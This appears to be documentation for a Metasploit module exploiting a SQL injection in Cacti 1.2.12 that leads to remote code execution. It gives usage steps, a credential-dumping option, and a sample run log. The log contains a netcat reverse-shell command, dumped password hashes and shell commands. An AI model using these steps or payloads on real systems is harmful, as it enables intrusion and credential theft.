## Vulnerable Application

This module exploits a SQL injection vulnerability in Cacti 1.2.12 and before.
An admin can exploit the filter variable within `color.php` to pull arbitrary
values as well as conduct stacked queries. With stacked queries, the
`path_php_binary` value is changed within the settings table to a payload,
and an update is called to  execute the payload.

After calling the payload, the value is reset.  This has to be done from
a new login session as any requests with the already logged in cookie
will timeout.

### Install

As of the writing of this module, Ubuntu's 12.04 repo had cacti as
1.2.10, so a simple `apt-get install cacti` will install a vulnerable
version.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use modules/exploits/unix/http/cacti_filter_sqli_rce`
1. Do: `set rhost [ip]`
1. Do: `set username [username]`
1. Do: `set password [password]`
1. Do: `run`
1. You should get a shell.

## Options

### CREDS

This option will dump usernames and passwords from cacti and database them. Defaults to `true`

## Scenarios

### Cacti 1.2.10 on Ubuntu 12.04

```
*] Processing cacti.rb for ERB directives.
resource (cacti.rb)> use modules/exploits/unix/http/cacti_filter_sqli_rce
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
resource (cacti.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (cacti.rb)> set verbose true
verbose => true
resource (cacti.rb)> set password cacti
password => cacti
resource (cacti.rb)> set lhost 1.1.1.1
lhost => 1.1.1.1
msf6 exploit(unix/http/cacti_filter_sqli_rce) > rcheck
[*] Reloading module...

[+] Version Detected: 1.2.10
[*] 2.2.2.2:80 - The target appears to be vulnerable.
resource (cacti.rb)> run
[+] mkfifo /tmp/ztgx; nc 1.1.1.1 4444 0</tmp/ztgx | /bin/sh >/tmp/ztgx 2>&1; rm /tmp/ztgx
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Grabbing CSRF
[+] CSRF: sid:ed80b7a38bb33740c8dc4de3ef119da44097b00c,1619810688
[*] Attempting login
[*] Dumping creds
[+] Username: admin, Password Hash: $2y$10$jnRjBpTxidVYScvDm5h30.nGgPkxtNFnAxY8Ixq42YHF/anUgq4x.
[+] Username: guest, Password Hash: 43e9a4ab75570f5b
[*] Backing-up path_php_binary value
[+] path_php_binary: /usr/bin/php
[*] Uploading payload
[*] Triggering payload
[*] Command shell session 1 opened (1.1.1.1:4444 -> 2.2.2.2:45130) at 2021-04-30 15:24:50 -0400
[*] Cleaning up environment
[*] Grabbing CSRF
[+] CSRF: sid:3ff4f97763dbb9ff9a357003daa6f65d8f296682,1619810709
[*] Attempting login
[*] Resetting DB Value

whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux ubuntu2004 5.4.0-31-generic #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
